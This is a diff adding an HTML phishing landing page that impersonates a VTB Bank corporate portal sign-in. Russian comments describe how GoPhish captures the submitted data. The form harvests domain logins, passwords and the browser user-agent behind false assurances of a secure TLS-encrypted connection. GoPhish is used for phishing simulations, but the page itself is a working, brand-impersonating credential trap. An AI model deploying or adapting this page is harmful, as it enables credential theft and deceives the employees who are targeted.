@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>VTB — Corporate Portal "Start"</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: 'Segoe UI', 'Roboto', 'Inter', system-ui, -apple-system, sans-serif;
+      background: #0A1428;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      position: relative;
+    }
+
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: radial-gradient(circle at 10% 20%, rgba(0,160,255,0.15), rgba(10,20,40,0.95));
+      z-index: -1;
+    }
+
+    .login-container {
+      max-width: 460px;
+      width: 100%;
+      background: #FFFFFF;
+      border-radius: 24px;
+      box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+      overflow: hidden;
+    }
+
+    .header {
+      padding: 32px 32px 0 32px;
+      text-align: center;
+    }
+
+    .logo {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 24px;
+    }
+
+    .logo-icon {
+      background: linear-gradient(135deg, #00287A, #0047B3);
+      width: 40px;
+      height: 40px;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 800;
+      font-size: 14px;
+      color: white;
+      letter-spacing: -0.5px;
+    }
+
+    .logo-text {
+      font-weight: 700;
+      font-size: 24px;
+      color: #00287A;
+      letter-spacing: -0.5px;
+    }
+
+    h1 {
+      font-size: 22px;
+      font-weight: 600;
+      color: #1E293B;
+      margin-bottom: 8px;
+    }
+
+    .subheader {
+      color: #64748B;
+      font-size: 14px;
+      margin-bottom: 28px;
+      border-bottom: 1px solid #E2E8F0;
+      padding-bottom: 20px;
+    }
+
+    .form-body {
+      padding: 0 32px 32px 32px;
+    }
+
+    .notice {
+      background: #EFF6FF;
+      color: #1D4ED8;
+      padding: 10px 12px;
+      border-radius: 10px;
+      font-size: 12px;
+      margin-bottom: 20px;
+      display: flex;
+      gap: 8px;
+      align-items: center;
+      border: 1px solid #BFDBFE;
+    }
+
+    .input-group {
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: #334155;
+      margin-bottom: 6px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 16px;
+      border: 1.5px solid #E2E8F0;
+      border-radius: 12px;
+      outline: none;
+      transition: all 0.2s;
+      background: #FFFFFF;
+      color: #0F172A;
+    }
+
+    input[type="text"]:focus,
+    input[type="password"]:focus {
+      border-color: #0047B3;
+      box-shadow: 0 0 0 3px rgba(0,71,179,0.12);
+    }
+
+    .btn-login {
+      width: 100%;
+      padding: 14px;
+      background: linear-gradient(90deg, #00287A, #0047B3);
+      border: none;
+      border-radius: 12px;
+      color: white;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: opacity 0.2s;
+      margin-top: 8px;
+      box-shadow: 0 4px 6px -1px rgba(0,40,122,0.2);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .btn-login:hover { opacity: 0.9; }
+    .btn-login:active { opacity: 0.8; }
+
+    .spinner {
+      display: none;
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(255,255,255,0.35);
+      border-radius: 50%;
+      border-top-color: white;
+      animation: spin 0.7s linear infinite;
+      flex-shrink: 0;
+    }
+    .spinner.active {
+      display: inline-block;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .info-block {
+      margin-top: 24px;
+      padding-top: 20px;
+      border-top: 1px solid #F1F5F9;
+      font-size: 12px;
+      color: #94A3B8;
+      text-align: center;
+      line-height: 1.8;
+    }
+
+    .forgot-link {
+      display: block;
+      text-align: right;
+      font-size: 12px;
+      color: #0047B3;
+      text-decoration: none;
+      margin-top: -12px;
+      margin-bottom: 20px;
+    }
+
+    .forgot-link:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+
+<div class="login-container">
+  <div class="header">
+    <div class="logo">
+      <div class="logo-icon">VTB</div>
+      <div class="logo-text">VTB Bank</div>
+    </div>
+    <h1>Sign in to Corporate Portal</h1>
+    <div class="subheader">"Start" — access to services and documents</div>
+  </div>
+
+  <div class="form-body">
+    <div class="notice">
+      🔐 Secure connection. Enter your corporate credentials.
+    </div>
+
+    <!--
+      ВАЖНО ДЛЯ GOPHISH:
+      - method="post" — GoPhish перехватывает POST и сохраняет все поля формы
+      - action="" — отправляет на текущий URL (включает ?id=), GoPhish регистрирует как "Submitted Data"
+      - Никаких e.preventDefault() — форма должна нативно отправляться
+    -->
+    <form method="post" action="">
+      <!-- GoPhish захватывает User-Agent через свои заголовки,
+           но скрытое поле дополнительно передаёт его как параметр -->
+      <input type="hidden" name="user_agent" id="user_agent_field">
+
+      <div class="input-group">
+        <label for="username">Corporate login (Domain\Login)</label>
+        <input
+          type="text"
+          id="username"
+          name="username"
+          placeholder="DOMAIN\ivanov.i.i"
+          autocomplete="off"
+          required
+        >
+      </div>
+
+      <div class="input-group">
+        <label for="password">Password</label>
+        <input
+          type="password"
+          id="password"
+          name="password"
+          placeholder="••••••••"
+          autocomplete="off"
+          required
+        >
+      </div>
+
+      <a href="https://vtb.bank.in/" class="forgot-link" target="_blank">Forgot password?</a>
+
+      <button type="submit" class="btn-login" id="submit_btn">
+        <span id="btn_text">Sign In</span>
+        <span class="spinner" id="btn_spinner"></span>
+      </button>
+
+      <div class="info-block">
+        <div>🔒 Data encrypted via TLS 1.3</div>
+        <div>© VTB Bank PJSC. Corporate Portal.</div>
+        <div id="timestamp"></div>
+      </div>
+    </form>
+  </div>
+</div>
+
+<script>
+  // Заполняем User-Agent в скрытое поле (GoPhish получит его в Submitted Data)
+  document.getElementById('user_agent_field').value = navigator.userAgent;
+
+  // Показываем спиннер на кнопке во время отправки формы
+  // (форма отправляется нативно — GoPhish захватит POST-данные)
+  document.querySelector('form').addEventListener('submit', function() {
+    var btn     = document.getElementById('submit_btn');
+    var btnText = document.getElementById('btn_text');
+    var spinner = document.getElementById('btn_spinner');
+    btnText.innerText = 'Signing in...';
+    spinner.classList.add('active');
+    btn.disabled = true;
+    // НЕ вызываем e.preventDefault() — форма уходит на GoPhish
+  });
+
+  // Дата в футере
+  var now = new Date();
+  document.getElementById('timestamp').innerText =
+    now.toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });
+</script>
+
+</body>
+</html>
